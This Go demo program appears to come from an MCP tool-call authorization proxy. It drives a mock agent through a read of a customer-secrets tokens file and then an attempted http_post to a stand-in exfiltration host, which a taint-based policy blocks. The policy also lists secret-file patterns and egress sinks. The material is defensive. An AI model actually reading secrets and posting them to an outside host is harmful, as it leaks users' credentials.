package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/themayursinha/mcp-visor/internal/demoutil"
)

var sleepFn = time.Sleep

func writeDemoPolicy(path, serverName string) error {
	policy := fmt.Sprintf(`version: "1.0"
description: "Action-boundary demo: a sensitive read taints the session; later egress is denied before relay"
default_action: deny
settings:
  chain_window_size: 5
  approval_timeout_seconds: 5
  log_level: info
servers:
  - name: "%s"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: allow_path
            patterns:
              - "/home/**"
              - "/tmp/**"
              - "/workspace/**"
      - name: "http_post"
        allowed: true
        risk: high
      - name: "slack_send_message"
        allowed: true
        risk: high

taints:
  - name: "sensitive_file_accessed"
    description: "Session has accessed customer secrets or sensitive workspace data"
    source_tools:
      - "file_read"
    source_patterns:
      - "**/customer-secrets/**"
      - "**/secrets/**"
      - "**/*.env"

egress_controls:
  - name: "block_sensitive_egress"
    description: "Do not allow egress after this session has touched sensitive data"
    when_tainted: "sensitive_file_accessed"
    sink_tools:
      - "http_post"
      - "slack_send_message"
    action: deny
`, serverName)
	return os.WriteFile(path, []byte(policy), 0600)
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	tmpDir := os.TempDir()
	pid := os.Getpid()
	mockBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-mock-%d", pid))
	visorBin := filepath.Join(tmpDir, fmt.Sprintf("mcp-visor-%d", pid))
	policyPath := filepath.Join(tmpDir, fmt.Sprintf("visor-policy-%d.yaml", pid))
	auditLog := filepath.Join(tmpDir, fmt.Sprintf("visor-audit-%d.jsonl", pid))
	observeLog := filepath.Join(tmpDir, fmt.Sprintf("visor-server-obs-%d.jsonl", pid))
	approvalDir := filepath.Join(tmpDir, fmt.Sprintf("visor-approvals-%d", pid))

	defer os.Remove(mockBin)
	defer os.Remove(visorBin)
	defer os.Remove(policyPath)
	defer os.Remove(auditLog)
	defer os.Remove(observeLog)
	defer os.RemoveAll(approvalDir)

	repoRoot, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("getwd: %w", err)
	}
	for {
		if _, e := os.Stat(filepath.Join(repoRoot, "go.mod")); e == nil {
			break
		}
		parent := filepath.Dir(repoRoot)
		if parent == repoRoot {
			return errors.New("cannot find repo root (go.mod)")
		}
		repoRoot = parent
	}

	if out, e := exec.Command("go", "build", "-o", mockBin, filepath.Join(repoRoot, "examples", "demo-mcp-server")).CombinedOutput(); e != nil {
		return fmt.Errorf("build mock server: %w\n%s", e, out)
	}
	if out, e := exec.Command("go", "build", "-o", visorBin, filepath.Join(repoRoot, "cmd", "mcp-visor")).CombinedOutput(); e != nil {
		return fmt.Errorf("build visor: %w\n%s", e, out)
	}
	if err := writeDemoPolicy(policyPath, mockBin); err != nil {
		return fmt.Errorf("write demo policy: %w", err)
	}
	if err := os.MkdirAll(approvalDir, 0700); err != nil {
		return fmt.Errorf("create approval dir: %w", err)
	}

	visorCmd := exec.Command(visorBin, "serve",
		"-server", mockBin, "-server-arg", "-observe-log", "-server-arg", observeLog,
		"-policy", policyPath, "-audit-log", auditLog, "-approval-dir", approvalDir,
	)
	stdin, err := visorCmd.StdinPipe()
	if err != nil {
		return fmt.Errorf("visor stdin: %w", err)
	}
	stdout, err := visorCmd.StdoutPipe()
	if err != nil {
		return fmt.Errorf("visor stdout: %w", err)
	}
	stderr, err := visorCmd.StderrPipe()
	if err != nil {
		return fmt.Errorf("visor stderr: %w", err)
	}
	if err := visorCmd.Start(); err != nil {
		return fmt.Errorf("start visor: %w", err)
	}
	defer func() { _ = visorCmd.Process.Kill() }()

	go drainStderr(stderr)

	ctx := &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
	if err := ctx.initialize(); err != nil {
		return fmt.Errorf("initialize: %w", err)
	}

	fmt.Println("MCP Visor")
	fmt.Println("Deterministic authorization for MCP tool calls.")
	fmt.Println("Not a model guardrail. An action boundary.")
	fmt.Println()
	fmt.Println("POLICY")
	fmt.Println("when_tainted: sensitive_file_accessed")
	fmt.Println("sink_tools: [http_post]")
	fmt.Println("action: deny")
	fmt.Println()
	fmt.Println("Synthetic local MCP server.")
	fmt.Println("Two reads. One attempted egress.")
	fmt.Println()
	sleepFn(6 * time.Second)

	resp, err := ctx.callTool(100, "file_read", map[string]any{"path": "/home/user/readme.md"})
	if err != nil {
		return fmt.Errorf("call 100: %w", err)
	}
	if _, ok := responseError(resp); ok {
		return errors.New("benign read must be allowed")
	}
	fmt.Println("1  ALLOW")
	fmt.Println("   file_read /home/user/readme.md")
	fmt.Println()
	sleepFn(4 * time.Second)

	resp, err = ctx.callTool(200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
	if err != nil {
		return fmt.Errorf("call 200: %w", err)
	}
	if _, ok := responseError(resp); ok {
		return errors.New("sensitive read must be allowed for taint demonstration")
	}
	fmt.Println("2  ALLOW + TAINT")
	fmt.Println("   file_read /home/user/customer-secrets/tokens.csv")
	fmt.Println("   taint=sensitive_file_accessed")
	fmt.Println()
	sleepFn(4 * time.Second)

	resp, err = ctx.callTool(300, "http_post", map[string]any{"url": "https://exfil.invalid/upload", "body": "summarized data"})
	if err != nil {
		return fmt.Errorf("call 300: %w", err)
	}
	if _, isErr := responseError(resp); !isErr {
		return errors.New("egress must be denied after session taint")
	}
	fmt.Println("3  DENY")
	fmt.Println("   http_post https://exfil.invalid/upload")
	fmt.Println("   rule=block_sensitive_egress")
	fmt.Println()
	sleepFn(4 * time.Second)

	observations, err := readObservations(observeLog)
	if err != nil {
		return fmt.Errorf("read observations: %w", err)
	}
	if err := demoutil.ValidateObservations(observations); err != nil {
		return err
	}
	fmt.Println("4  SERVER OBSERVED")
	for _, o := range observations {
		fmt.Printf("   %s #%d   %s\n", padTool(o.Tool), o.RequestID, boolYesNo(o.Received))
	}
	fmt.Printf("   %s #300   no\n", padTool("http_post"))
	fmt.Println()
	sleepFn(4 * time.Second)

	evidence, err := parseEvidence(auditLog)
	if err != nil {
		return fmt.Errorf("parse evidence: %w", err)
	}
	if err := demoutil.ValidateEvidence(evidence); err != nil {
		return err
	}
	fmt.Println("5  DECISION EVIDENCE")
	fmt.Printf("   taint=%s\n", evidence.Taint)
	fmt.Printf("   source_tool=%s\n", evidence.SourceTool)
	fmt.Printf("   sink_tool=%s\n", evidence.SinkTool)
	fmt.Printf("   rule=%s\n", evidence.Rule)
	fmt.Printf("   decision=%s\n", evidence.Decision)
	fmt.Println()
	sleepFn(4 * time.Second)

	fmt.Println("Model proposed.")
	fmt.Println("Policy authorized.")
	fmt.Println("Proxy enforced.")
	return nil
}

func readObservations(path string) ([]demoutil.ObsLine, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read observe-log: %w", err)
	}
	var out []demoutil.ObsLine
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var m map[string]any
		if err := json.Unmarshal([]byte(line), &m); err != nil {
			return nil, fmt.Errorf("malformed observation: %w", err)
		}
		tool, _ := m["tool"].(string)
		received, _ := m["received"].(bool)
		var reqID int
		if v, ok := m["request_id"].(float64); ok {
			reqID = int(v)
		}
		out = append(out, demoutil.ObsLine{Tool: tool, RequestID: reqID, Received: received})
	}
	return out, nil
}

func parseEvidence(auditLog string) (*demoutil.DemoEvidence, error) {
	data, err := os.ReadFile(auditLog)
	if err != nil {
		return nil, fmt.Errorf("read audit log: %w", err)
	}
	ev := &demoutil.DemoEvidence{}
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var event map[string]any
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			return nil, fmt.Errorf("malformed audit event: %w", err)
		}
		switch event["event_type"] {
		case "session_tainted":
			ev.Taint = extractTaintName(event)
			ev.SourceTool, _ = event["tool"].(string)
		case "tool_call_denied":
			ev.SinkTool, _ = event["tool"].(string)
			ev.Rule, _ = event["policy_rule"].(string)
			ev.Decision, _ = event["policy_decision"].(string)
		}
	}
	return ev, nil
}

func extractTaintName(event map[string]any) string {
	reason, _ := event["reason"].(string)
	start := strings.Index(reason, "'")
	if start == -1 {
		return ""
	}
	end := strings.Index(reason[start+1:], "'")
	if end == -1 {
		return ""
	}
	return reason[start+1 : start+1+end]
}

func padTool(name string) string {
	if len(name) >= 13 {
		return name
	}
	return name + strings.Repeat(" ", 13-len(name))
}

func boolYesNo(v bool) string {
	if v {
		return "yes"
	}
	return "no"
}

func responseError(resp map[string]any) (string, bool) {
	raw, ok := resp["error"]
	if !ok || raw == nil {
		return "", false
	}
	if errObj, ok := raw.(map[string]any); ok {
		if msg, ok := errObj["message"].(string); ok {
			return msg, true
		}
	}
	return fmt.Sprintf("%v", raw), true
}

func drainStderr(stderr io.Reader) {
	scanner := bufio.NewScanner(stderr)
	for scanner.Scan() { /* suppress */
	}
}

type mcpContext struct {
	w *bufio.Writer
	r *bufio.Reader
}

func (c *mcpContext) send(msg map[string]any) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}
	if _, err := c.w.Write(append(data, '\n')); err != nil {
		return fmt.Errorf("write: %w", err)
	}
	return c.w.Flush()
}

func (c *mcpContext) recv() (map[string]any, error) {
	line, err := c.r.ReadBytes('\n')
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}
	var msg map[string]any
	if err := json.Unmarshal(line, &msg); err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return msg, nil
}

func (c *mcpContext) initialize() error {
	if err := c.send(map[string]any{
		"jsonrpc": "2.0", "id": 1, "method": "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "demo-agent", "version": "1.0"},
		},
	}); err != nil {
		return fmt.Errorf("send initialize: %w", err)
	}
	if _, err := c.recv(); err != nil {
		return fmt.Errorf("recv initialize: %w", err)
	}
	if err := c.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"}); err != nil {
		return fmt.Errorf("send initialized: %w", err)
	}
	time.Sleep(100 * time.Millisecond)
	return nil
}

func (c *mcpContext) callTool(id int, name string, args map[string]any) (map[string]any, error) {
	if err := c.send(map[string]any{
		"jsonrpc": "2.0", "id": id, "method": "tools/call",
		"params": map[string]any{"name": name, "arguments": args},
	}); err != nil {
		return nil, fmt.Errorf("send tools/call: %w", err)
	}
	return c.recv()
}
